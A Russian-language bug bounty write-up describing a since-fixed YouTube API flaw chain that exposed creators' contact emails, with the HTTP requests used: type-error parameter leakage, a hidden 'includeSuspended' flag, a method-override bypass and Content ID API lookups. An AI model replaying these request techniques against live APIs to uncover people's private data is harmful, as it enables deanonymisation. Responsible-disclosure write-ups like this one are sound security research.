# Раскрытие email-адресов авторов YouTube за $20,000  
**Дата обнаружения:** 13 марта 2025 года  

## Обнаружение уязвимости в Google API  

Во время экспериментов с Google API я выявил критическую уязвимость, позволяющую получать отладочную информацию о всех параметрах запроса.  

### Механизм уязвимости  

При отправке запроса с **некорректным типом параметра**, сервер возвращал подробную отладочную информацию:  

#### Пример запроса:
```http
POST /youtubei/v1/browse HTTP/2
Host: youtubei.googleapis.com
Content-Type: application/json
Content-Length: 164

{
  "context": {
    "client": {
      "clientName": "WEB",
      "clientVersion": "2.20241101.01.00"
    }
  },
  "browseId": 1 
}
```
**Ответ от сервера:**  
```http
HTTP/2 400 Bad Request  
Content-Type: application/json; charset=UTF-8  
Server: scaffolding on HTTPServer2  

{  
  "error": {  
    "code": 400,  
    "message": "Invalid value at 'browse_id' (TYPE_STRING), 1",  
    "errors": [  
      {  
        "message": "Invalid value at 'browse_id' (TYPE_STRING), 1",  
        "reason": "invalid"  
      }  
    ],  
    "status": "INVALID_ARGUMENT",    
  }  
}  
```  

Сервер ожидал, что `browseId` будет строкой (например, `"UCX6OQ3DkcsbYNE6H8uQQuVA"`), но из-за передачи числа возвращалась подробная ошибка.  

## Использование ProtoJson для утечки параметров  

API YouTube поддерживает не только JSON, но и формат **ProtoJson** (`application/json+protobuf`). Это позволяет передавать параметры в виде массива, а не объекта. Мы можем злоупотребить этим, чтобы утечь названия всех возможных параметров запроса:  

**Запрос:**  
```http
POST /youtubei/v1/browse HTTP/2  
Host: youtubei.googleapis.com  
Content-Type: application/json+protobuf  
Content-Length: 22  

[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30]  
```  

**Ответ:**  
```http
HTTP/2 400 Bad Request  
Content-Type: application/json; charset=UTF-8  
Server: scaffolding on HTTPServer2  

{  
  "error": {  
    "code": 400,  
    "message": "Invalid value at 'context' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.InnerTubeContext), 1\nInvalid value at 'browse_id' (TYPE_STRING), 2\n...",    
  }  
}  
```  

## Автоматизация с помощью `req2proto`  
Для автоматизации этого процесса я написал инструмент `req2proto`, который анализирует ответы и восстанавливает структуру запроса в формате `.proto`:  

```bash
$ ./req2proto -X POST -u https://youtubei.googleapis.com/youtubei/v1/browse -p youtube.api.pfiinnertube.GetBrowseRequest -o output -d 3  
```  

Результат (часть файла `output/youtube/api/pfiinnertube/message.proto`):  
```proto
syntax = "proto3";  

package youtube.api.pfiinnertube;  

message GetBrowseRequest {  
  InnerTubeContext context = 1;  
  string browse_id = 2;  
  string params = 3;  
  string continuation = 7;  
  ...  
}  
```  
```markdown
Исследование конечной точки YouTube Studio  

При анализе запросов YouTube Studio я обнаружил интересную конечную точку:  
```http
POST /youtubei/v1/creator/get_creator_channels?alt=json HTTP/2  
Host: studio.youtube.com  
Content-Type: application/json  

{  
  "context": { ... },  
  "channelIds": ["UCeGCG8SYUIgFO13NyOe6reQ"],  
  "mask": {  
    "channelId": true,  
    "monetizationStatus": true,    
  }  
}  
```  

Она используется для получения данных о канале во вкладке "Заработок". При этом можно запрашивать данные **любых каналов**, но с ограниченным набором масок:  

**Пример запроса для чужого канала:**  
```json
{  
  "channelIds": ["UCdcUmdOxMrhRjKMw-BX19AA"],  
  "mask": {  
    "channelId": true,  
    "title": true,  
    "thumbnailDetails": { "all": true },  
    "metric": { "all": true },  
    "timeCreatedSeconds": true,  
    "isNameVerified": true,  
    "channelHandle": true  
  }  
}  
```  

**Ответ:**  
```json
{  
  "channels": [{  
    "channelId": "UCdcUmdOxMrhRjKMw-BX19AA",  
    "title": "Niko Omilana",  
    "metric": {  
      "subscriberCount": "7700000",  
      "videoCount": "142",  
      "totalVideoViewCount": "650836435"  
    },  
    "timeCreatedSeconds": "1308700645",  
    "isNameVerified": true,  
    "channelHandle": "@Niko"  
  }]  
}  
```  

При попытке запросить конфиденциальные маски (например, `monetizationDetails`) возвращалась ошибка:  
```json
{  
  "error": {  
    "code": 403,  
    "message": "The caller does not have permission",  
    "status": "PERMISSION_DENIED"  
  }  
}  
```  

## Обнаружение скрытых параметров  

С помощью `req2proto` я выяснил, что в запросе есть **два секретных параметра**:  
```proto
message GetCreatorChannelsRequest {    
  bool critical_read = 6;  // Не давал эффекта  
  bool include_suspended = 7;  // Ключевой параметр!  
}  
```  

При активации `includeSuspended` в ответе появились новые данные:  
```json
{  
  "contentOwnerAssociation": {  
    "externalContentOwnerId": "Ks_zqCBHrAbeQqsVRGL7gw",  
    "createTime": { "seconds": "1693939737" },  
    "permissions": {  
      "canWebClaim": true,  
      "canViewRevenue": true  
    },  
    "isDefaultChannel": false  
  }  
}  
```  

### Что такое Content Owner?  
- **Content Manager** — особые аккаунты для правообладателей, позволяющие монетизировать чужой контент через Content ID.  
- **IVP (Individual Video Partnership)** — упрощённая версия для обычных авторов YouTube (старое название партнёрской программы).  

Каждый монетизированный канал автоматически получает `contentOwnerId`, привязанный к email.  

```json
{  
  "contentOwnerId": "Ks_zqCBHrAbeQqsVRGL7gw",  
  "displayName": "Nia",  
  "primaryContactEmail": "<redacted>@gmail.com",  
  "type": "CONTENT_OWNER_TYPE_IVP"  
}  
```  
```markdown
## Использование Content ID API для раскрытия email

Обнаружив, что можно получить `contentOwnerId`, я исследовал **Content ID API** (предназначенный для правообладателей). Ключевая эндпоинт:

```http
GET /youtubePartner/v1/contentOwners?alt=json HTTP/2
Host: www.googleapis.com
```

Обычно она возвращает ошибку 403 для обычных пользователей, но **работает для монетизированных авторов** через API Explorer:

**Ответ для IVP-аккаунта:**
```json
{
  "kind": "youtubePartner#contentOwnerList",
  "items": [{
    "id": "kdVwk95TnaCSLJJfyIFoqw",
    "displayName": "omilana7", 
    "conflictNotificationEmail": "niko***@yahoo.co.uk"
  }]
}
```

### Схема атаки:
1. Через `/get_creator_channels` с `includeSuspended=true` получаем `contentOwnerId` жертвы.
2. Используя аккаунт с монетизированным каналом, запрашиваем email через Content ID API.
3. Profit! ✨

## Хронология исправления
| Дата | Событие |
|------|---------|
| 12.12.2024 | Отчет отправлен в Google |
| 16.12.2024 | Подтверждение уязвимости |
| 21.01.2025 | Награда $13,337 (категория "Обход защиты") |
| 23.01.2025 | Доплата $6,663 (за раскрытие персональных данных) |
| 10.02.2025 | Запланировано разглашение |
| 21.02.2025 | Фикс подтвержден |

## Технические детали
1. **Обход документации InnerTube**  
   Стандартный запрос к `/$discovery/rest` блокировался, но работал с заголовком:
   ```http
   POST /$discovery/rest HTTP/2
   X-Http-Method-Override: GET
   ```
   В ответе находился параметр `includeSuspended`:
   ```json
   "YoutubeApiInnertubeGetCreatorChannelsRequest": {
     "properties": {
       "includeSuspended": { "type": "boolean" }
     }
   }
   ```

2. **Особенности Content Owner**  
   - IVP-аккаунты создаются автоматически при монетизации  
   - Email привязывается на этапе верификации  
   - Content ID API не проверял тип аккаунта, только факт монетизации


**Итоговая награда: $20,000** (максимальный уровень для VRP)
``` 
